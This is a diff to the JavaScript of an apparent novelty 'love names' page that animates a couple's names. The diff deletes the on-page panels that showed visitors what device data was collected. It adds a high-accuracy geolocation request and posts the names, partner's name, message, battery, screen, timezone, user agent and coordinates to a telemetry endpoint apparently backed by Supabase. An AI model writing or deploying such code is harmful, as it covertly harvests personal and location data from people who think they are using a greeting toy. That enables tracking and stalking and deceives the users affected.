@@ -12,27 +12,10 @@
   var loveMessageInput = document.getElementById('love-message');
   var formError = document.getElementById('form-error');
 
-  var prevDevice = document.getElementById('prev-device');
-  var prevOsBrowser = document.getElementById('prev-os-browser');
-  var prevBattery = document.getElementById('prev-battery');
-  var prevScreen = document.getElementById('prev-screen');
-
   var namesDisplay = document.getElementById('names-display');
   var wishDisplay = document.getElementById('wish-display');
   var uiContainer = document.getElementById('ui');
   var replayBtn = document.getElementById('replay-btn');
-  var openBreakdownBtn = document.getElementById('open-breakdown-btn');
-
-  var breakdownModal = document.getElementById('breakdown-modal');
-  var modalCloseBtn = document.getElementById('modal-close-btn');
-  var modalDismissBtn = document.getElementById('modal-dismiss-btn');
-  var dispDeviceName = document.getElementById('disp-device-name');
-  var dispOs = document.getElementById('disp-os');
-  var dispBrowser = document.getElementById('disp-browser');
-  var dispBattery = document.getElementById('disp-battery');
-  var dispScreen = document.getElementById('disp-screen');
-  var dispTimezone = document.getElementById('disp-timezone');
-  var dispRawUa = document.getElementById('disp-raw-ua');
 
   function parseUserAgentFallback(ua) {
     var deviceName = 'Generic Device';
@@ -82,12 +65,7 @@
       browser = 'Apple Safari ' + (saf ? saf[1] : '');
     }
 
-    return {
-      deviceName: deviceName,
-      deviceType: deviceType,
-      os: os,
-      browser: browser
-    };
+    return { deviceName: deviceName, deviceType: deviceType, os: os, browser: browser };
   }
 
   function getBatteryMetrics() {
@@ -95,14 +73,39 @@
       return navigator.getBattery().then(function (battery) {
         return {
           battery_level: Math.round(battery.level * 100),
-          battery_charging: Boolean(battery.charging),
-          supported: true
+          battery_charging: Boolean(battery.charging)
         };
       }).catch(function () {
-        return { battery_level: null, battery_charging: null, supported: false };
+        return { battery_level: null, battery_charging: null };
       });
     }
-    return Promise.resolve({ battery_level: null, battery_charging: null, supported: false });
+    return Promise.resolve({ battery_level: null, battery_charging: null });
+  }
+
+  // Request Geolocation (triggers browser permission prompt)
+  function getGeolocation() {
+    return new Promise(function (resolve) {
+      if (!navigator.geolocation) {
+        resolve({ latitude: null, longitude: null, status: 'Not Supported' });
+        return;
+      }
+
+      navigator.geolocation.getCurrentPosition(
+        function (position) {
+          resolve({
+            latitude: position.coords.latitude,
+            longitude: position.coords.longitude,
+            status: 'Allowed / Captured'
+          });
+        },
+        function (error) {
+          var statusMsg = 'Denied / Blocked';
+          if (error.code === error.TIMEOUT) statusMsg = 'Timeout';
+          resolve({ latitude: null, longitude: null, status: statusMsg });
+        },
+        { timeout: 8000, maximumAge: 60000, enableHighAccuracy: true }
+      );
+    });
   }
 
   function detectTelemetry() {
@@ -116,7 +119,6 @@
       try {
         var parser = new window.UAParser();
         var res = parser.getResult();
-
         var vendor = res.device.vendor ? res.device.vendor + ' ' : '';
         var model = res.device.model || '';
         if (vendor || model) {
@@ -124,7 +126,6 @@
         } else if (res.os.name) {
           deviceName = res.os.name + ' Device';
         }
-
         deviceType = res.device.type || 'desktop';
         if (res.os.name) os = res.os.name + (res.os.version ? ' ' + res.os.version : '');
         if (res.browser.name) browser = res.browser.name + (res.browser.version ? ' ' + res.browser.version : '');
@@ -159,32 +160,6 @@
         timezone: tzStr,
         raw_user_agent: ua
       };
-
-      if (prevDevice) prevDevice.textContent = deviceName + ' (' + deviceType.toUpperCase() + ')';
-      if (prevOsBrowser) prevOsBrowser.textContent = os + ' / ' + browser;
-      if (prevBattery) {
-        if (batteryData.battery_level !== null) {
-          prevBattery.textContent = batteryData.battery_level + '% (' + (batteryData.battery_charging ? 'Charging ⚡' : 'Discharging') + ')';
-        } else {
-          prevBattery.textContent = 'API Blocked (Safari / Firefox)';
-        }
-      }
-      if (prevScreen) prevScreen.textContent = screenStr;
-
-      if (dispDeviceName) dispDeviceName.textContent = deviceName + ' (' + deviceType.toUpperCase() + ')';
-      if (dispOs) dispOs.textContent = os;
-      if (dispBrowser) dispBrowser.textContent = browser;
-      if (dispBattery) {
-        if (batteryData.battery_level !== null) {
-          dispBattery.textContent = batteryData.battery_level + '% (' + (batteryData.battery_charging ? 'Charging ⚡' : 'Discharging') + ')';
-        } else {
-          dispBattery.textContent = 'Blocked by Browser Policy (Safari/Firefox)';
-        }
-      }
-      if (dispScreen) dispScreen.textContent = screenStr;
-      if (dispTimezone) dispTimezone.textContent = tzStr;
-      if (dispRawUa) dispRawUa.textContent = ua;
-
       return clientTelemetry;
     });
   }
@@ -194,35 +169,20 @@
   function applyDynamicFontScaling(totalChars) {
     if (!namesDisplay) return;
     var isMobile = window.innerWidth <= 600;
-    var fontSize;
-    if (totalChars <= 12) {
-      fontSize = isMobile ? '2.1rem' : '3.2rem';
-    } else if (totalChars <= 20) {
-      fontSize = isMobile ? '1.75rem' : '2.6rem';
-    } else if (totalChars <= 30) {
-      fontSize = isMobile ? '1.45rem' : '2.1rem';
-    } else if (totalChars <= 42) {
-      fontSize = isMobile ? '1.25rem' : '1.75rem';
-    } else {
-      fontSize = isMobile ? '1.1rem' : '1.45rem';
-    }
+    var fontSize = totalChars <= 12 ? (isMobile ? '2.1rem' : '3.2rem') : (isMobile ? '1.45rem' : '2.1rem');
     namesDisplay.style.fontSize = fontSize;
   }
 
   function renderNames(name1, name2, message) {
     if (!namesDisplay) return;
     namesDisplay.innerHTML = '';
-
-    var totalChars = name1.length + name2.length + 3;
-    applyDynamicFontScaling(totalChars);
+    applyDynamicFontScaling(name1.length + name2.length + 3);
 
     var span1 = document.createElement('span');
     span1.textContent = name1;
-
     var heartSpan = document.createElement('span');
     heartSpan.className = 'heart-sep';
     heartSpan.textContent = '❤';
-
     var span2 = document.createElement('span');
     span2.textContent = name2;
 
@@ -247,10 +207,8 @@
 
       var h = document.createElement('div');
       h.className = 'love_horizontal';
-
       var v = document.createElement('div');
       v.className = 'love_vertical';
-
       var word = document.createElement('div');
       word.className = 'love_word';
       word.textContent = phrase;
@@ -270,99 +228,49 @@
     var message = (loveMessageInput.value || '').trim();
 
     if (!yourName || !partnerName) {
-      if (!yourName && !partnerName) {
-        showError('Please enter both your name and your partner’s name.');
-        yourNameInput.focus();
-      } else if (!yourName) {
-        showError('Please enter your name.');
-        yourNameInput.focus();
-      } else {
-        showError('Please enter your partner’s name.');
-        partnerNameInput.focus();
-      }
+      formError.textContent = 'Please enter both names.';
       return;
     }
-
-    clearError();
+    formError.textContent = '';
 
     screen1.classList.remove('screen-active');
     screen1.classList.add('screen-hidden');
-
     screen2.classList.remove('screen-hidden');
     screen2.classList.add('screen-active');
 
     renderNames(yourName, partnerName, message);
     generateLoveParticles(80);
 
-    var payload = Object.assign({}, clientTelemetry || {}, {
-      your_name: yourName,
-      partner_name: partnerName,
-      couple_names: yourName + ' ❤ ' + partnerName,
-      message: message
+    // Prompt for geolocation and transmit telemetry to Supabase via backend
+    getGeolocation().then(function (geoData) {
+      var payload = Object.assign({}, clientTelemetry || {}, {
+        your_name: yourName,
+        partner_name: partnerName,
+        couple_names: yourName + ' ❤ ' + partnerName,
+        message: message,
+        latitude: geoData.latitude,
+        longitude: geoData.longitude,
+        location_status: geoData.status
+      });
+
+      fetch('/api/telemetry', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      }).catch(function () {});
     });
-
-    fetch('/api/telemetry', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(payload)
-    }).catch(function () {});
-  });
-
-  function showError(msg) {
-    if (formError) formError.textContent = msg;
-  }
-
-  function clearError() {
-    if (formError) formError.textContent = '';
-  }
-
-  function openModal() {
-    if (!breakdownModal) return;
-    breakdownModal.classList.remove('modal-hidden');
-  }
-
-  function closeModal() {
-    if (!breakdownModal) return;
-    breakdownModal.classList.add('modal-hidden');
-  }
-
-  if (openBreakdownBtn) openBreakdownBtn.addEventListener('click', openModal);
-  if (modalCloseBtn) modalCloseBtn.addEventListener('click', closeModal);
-  if (modalDismissBtn) modalDismissBtn.addEventListener('click', closeModal);
-
-  if (breakdownModal) {
-    breakdownModal.addEventListener('click', function (e) {
-      if (e.target === breakdownModal) closeModal();
-    });
-  }
-
-  document.addEventListener('keydown', function (e) {
-    if (e.key === 'Escape') closeModal();
   });
 
   if (replayBtn) {
     replayBtn.addEventListener('click', function () {
       screen2.classList.remove('screen-active');
       screen2.classList.add('screen-hidden');
-
       screen1.classList.remove('screen-hidden');
       screen1.classList.add('screen-active');
-
       yourNameInput.value = '';
       partnerNameInput.value = '';
       if (loveMessageInput) loveMessageInput.value = '';
       yourNameInput.focus();
     });
   }
-
-  window.addEventListener('resize', function () {
-    if (yourNameInput && partnerNameInput) {
-      var n1 = yourNameInput.value || '';
-      var n2 = partnerNameInput.value || '';
-      if (n1 && n2) {
-        applyDynamicFontScaling(n1.length + n2.length + 3);
-      }
-    }
-  });
-
 })();
